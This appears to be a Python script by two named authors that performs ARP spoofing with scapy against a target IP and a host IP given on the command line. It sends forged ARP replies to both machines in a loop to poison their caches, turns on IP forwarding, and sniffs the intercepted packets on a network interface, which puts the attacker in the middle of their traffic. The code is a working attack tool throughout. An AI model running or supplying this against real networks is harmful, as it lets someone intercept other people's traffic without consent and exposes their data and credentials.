# /usr/bin/python3 
'''
ARPSpoof Program by Clayton Johnson and Mitchell Bohn

Steps:
	Take IPs and find their MAC Addresses through ARP Request
We need to run this automatically: sysctl -w net.ipv4.ip_forward=1

'''
import argparse
from scapy.all import Ether, ARP, sr, send, sniff
from time import sleep
import threading
import sys
import subprocess

def get_mac_address(ip):
	#Make ARP Request to get MAC addy for given ip
	#print(f'Making ARP Request for {ip}')
	resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10, verbose=0)
	for s,r in resp:
		print(resp[0][1][ARP].hwsrc)
		return resp[0][1][ARP].hwsrc

def clean_ip(addr):
	#Makes sure that the ip address is valid
	#print(f'Cleaning {addr}')
	ret_addr = ''
	addr_list = addr.split('.')
	if len(addr_list) < 4:
		ret_addr = None
	else:
		#print(f'list: {addr_list}')
		for byte in addr_list:
			#print(f'byte: {byte} => {int(byte)}')
			if (int(byte) >= 0) and (int(byte) <= 255):
				ret_addr += byte + '.'
	return ret_addr[:-1]

def clean_mac(mac):
	#Makes sure that the mac address is valid

	return mac

def poison(mac_1=None, ip_1=None, mac_2=None, ip_2=None):
	print('Poisoning...')
	if mac_1 and ip_1 and mac_2 and ip_2:
		#Build arp packet
		pkt12 = ARP(pdst=ip_1, hwdst=mac_1, psrc=ip_2, op='is-at')
		pkt21 = ARP(pdst=ip_2, hwdst=mac_2, psrc=ip_1, op='is-at')
		
		while True:
			try:
				#Send arp packet to 
				send(pkt12, verbose=0)	
				send(pkt21, verbose=0)
			
				#Just chill out for a second, we're in no rush...
				sleep(3)
			except KeyboardInterrupt:
				print('Poisoning ceased...')
				sys.exit(0)

			

def start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac, poison_thread):
	print('Sniffing initiated...')
	while(True):
		try:
			pkts = sniff(count=1, filter=None, iface="eth1") #This 'iface' may have to change. My default of eth0 points to the wrong network
			if pkts and not pkts[0].haslayer(ARP):
				#Print the packet we got
				#print('Received packet: {}'.format(pkts.summary()))
				#print('Datatype: {}'.format(type(pkts)))
				for pkt in pkts:
					print('Received:')
					print('\tDatatype of pkt: {}'.format(type(pkt)))
					print('\tDestination: {}'.format(pkt.dst))
					print('\tSource : {}'.format(pkt.src))
					
					'''
					#This stuff is helpful if we also want to eventually spoof the IP, but the code works as it is...
					if pkt.src == t_mac:
						#Forward pkt to h_mac from me
						pkt.src = pkt.dst
						pkt.dst = h_mac
					elif pkt.src == h_mac:
						#Forward pkt to t_mac
						pkt.src = pkt.dst
						pkt.dst = t_mac
					else:
						print('Why did I get this?')
					print('Sent:')
					print('\tDatatype of pkt: {}'.format(type(pkt)))
					print('\tDestination: {}'.format(pkt.dst))
					print('\tSource : {}'.format(pkt.src))

					#Send the packet to it's original destination
					send(pkt, iface="eth1", verbose=0)'''
				
				
		except KeyboardInterrupt: 
			print('Sniffing ceased...')

			#Automatically disable port forwarding
			subprocess.check_output(['sysctl','-w','net.ipv4.ip_forward=1'])
			sys.exit(0)

def spoof_time(t_ip, h_ip):
	#Automatically enable port forwarding
	subprocess.check_output(['sysctl','-w','net.ipv4.ip_forward=1'])
	
	#print(f'Target IP: {t_ip}')
	print('Target IP: {}'.format(t_ip))
	#print(f'Host IP: {h_ip}')
	print('Host IP: {}'.format(h_ip))
	
	#Get MAC Addys for both target and host ips
	t_mac = get_mac_address(t_ip)
	h_mac = get_mac_address(h_ip)

	#Poison cache -> Saw an idea that split the cache poisoning to a separate thread to keep it constant
	# I like this idea...
	
	#Kick off thread to poison the cache
	poison_thread = threading.Thread(target=poison, args=(clean_mac(t_mac), t_ip, clean_mac(h_mac), h_ip), name='def_not_arp_spoof')
	poison_thread.start()
	#start_new_thread(poison, (clean_mac(t_mac), t_ip, clean_mac(h_mac), h_ip))

	#Receive traffic and output
	start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac, poison_thread)

if __name__ == '__main__':
	#Usage : $ arpspoof.py -t <targetIP> -r <hostIP>
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', help='target ip address')
	parser.add_argument('-r', help='host ip address')
	args = parser.parse_args()
	if args.t and args.r:
		spoof_time(clean_ip(args.t), clean_ip(args.r))
	else:
		parser.print_help(sys.stderr)
		sys.exit(1)	
